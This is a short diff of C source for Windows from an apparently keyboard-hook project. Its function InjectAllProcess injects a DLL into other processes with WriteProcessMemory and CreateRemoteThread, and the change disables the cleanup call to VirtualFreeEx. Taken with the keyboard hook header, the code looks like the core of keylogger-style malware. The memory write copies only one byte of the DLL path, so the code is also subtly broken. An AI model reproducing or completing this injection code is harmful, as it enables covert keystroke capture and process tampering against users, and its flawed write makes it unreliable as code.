@@ -5,7 +5,6 @@
 #include "stdio.h"
 #include "KeyBoardHook.h"
 #include "dbghelp.h"
-#include <Windows.h>
 #include "tlhelp32.h"
 
 #pragma comment(lib,"Dbghelp.lib")
@@ -221,7 +220,7 @@ BOOL InjectAllProcess()
 		SIZE_T sizeofWrite;
 		WriteProcessMemory(hProcess, baseAddress, path, sizeof(char), &sizeofWrite);
 		CreateRemoteThread(hProcess,NULL,0, pfnAddress, baseAddress,0,NULL);
-		VirtualFreeEx(hProcess, baseAddress, strlen(path) + 1, MEM_RELEASE);
+		//VirtualFreeEx(hProcess, baseAddress, strlen(path) + 1, MEM_RELEASE);
 		//if (nMode == 1)
 		//	Inject(dwPID, szDllPath);
 		//else
